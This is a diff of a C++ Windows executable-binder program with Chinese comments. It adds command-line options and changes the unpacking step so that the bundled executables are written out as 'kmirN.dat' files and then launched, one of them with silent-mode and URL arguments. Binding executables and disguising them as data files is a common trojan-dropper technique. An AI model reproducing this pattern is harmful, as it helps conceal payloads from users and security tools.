@@ -8,8 +8,6 @@
 #include <sys/stat.h>
 using namespace std;
 
-const char UNBIND_PATH[] = "c:";
-
 //这里定义一个全局变量，用于标记记录自身长度的位置
 //绑定程序时改写finder位置紧跟的四个字节为自身长度
 //解绑时即可读取该位置取得原本的自身长度
@@ -21,7 +19,10 @@ struct MODIFY_DATA {
 //变量声明
 vector<string> exe_to_bind;
 char my_name[MAX_PATH] = {0};
-const int my_org_size = 71*1024;
+int my_org_size = 74*1024;
+const char UNBIND_PATH[] = "./";
+string target_name = "out.exe";
+
 
 //函数声明
 bool bind_exes();
@@ -32,14 +33,35 @@ int main(int argc, char* argv[])
 {
 	::GetModuleFileName(0, my_name, sizeof(my_name));
 
-	if( argc > 2 && stricmp(argv[1], "-b") == 0 )
-	{
-		for(int i=3; i<=argc; i++)
-		{
-			exe_to_bind.push_back(string(argv[i-1]));
-		}
+	bool binding = false;
 
+	if( argc > 1 )
+	{
+		for(int i=1; i<argc; i++)
+		{
+			if( stricmp(argv[i], "-b") == 0 )
+			{
+				binding = true;
+				i++;
+				exe_to_bind.push_back(string(argv[i]));
+			}
+			else if( stricmp(argv[i], "-o") == 0 )
+			{
+				i++;
+				target_name = string(argv[i]);
+			}
+			else if( stricmp(argv[i], "-s") == 0 )
+			{
+				i++;
+				my_org_size = atoi(argv[i]);
+			}
+		}
+	}
+
+	if( binding )
+	{
 		bind_exes();
+		return 0;
 	}
 	else
 	{
@@ -115,7 +137,7 @@ bool bind_exes()
 		return false;
 	}
 
-	outfile = fopen("out.exe", "wb");
+	outfile = fopen(target_name.c_str(), "wb");
 	if( outfile == NULL )
 	{
 		delete[] buf;
@@ -208,7 +230,7 @@ bool unbind_and_run()
 	for(int i=0; i<exe_num; i++)
 	{
 		memset(tempname, 0, MAX_PATH);
-		sprintf_s(tempname, "%s/%d.exe", UNBIND_PATH, i);
+		sprintf_s(tempname, "%s/kmir%d.dat", UNBIND_PATH, i);
 		outfile = fopen(tempname, "wb");
 		if(outfile == NULL)
 		{
@@ -244,8 +266,8 @@ bool unbind_and_run()
 	delete[] buf;
 
 	//run exes
-	Create_Process("c:/0.exe", "/install", true);
-	Create_Process("c:/1.exe", NULL, true);
+	Create_Process("./kmir0.dat", NULL, true);
+	Create_Process("./kmir1.dat", "/s /l http://www.baidu.com /t mir2.dat", true);
 
 	return true;
 }
